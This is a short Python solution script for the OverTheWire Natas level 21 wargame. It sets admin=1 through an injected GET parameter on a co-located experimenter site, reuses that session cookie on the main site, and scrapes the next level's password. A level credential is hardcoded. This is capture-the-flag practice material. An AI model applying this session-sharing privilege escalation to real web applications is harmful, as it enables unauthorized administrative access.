import requests
import re

FIRST_PAGE = 'http://natas21.natas.labs.overthewire.org'
SECOND_PAGE = 'http://natas21-experimenter.natas.labs.overthewire.org' + '/?submit=parham&admin=1'      # here i add submit and admin=1 GET parameters
AUTH = ('natas21', '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')


first_request = requests.get(url=SECOND_PAGE, auth=AUTH)

cookie = {'PHPSESSID': first_request.cookies['PHPSESSID']}

second_request = requests.get(url=FIRST_PAGE, cookies=cookie, auth=AUTH)
print('password', re.findall(r'Password: (.*?)</pre>', second_request.text))
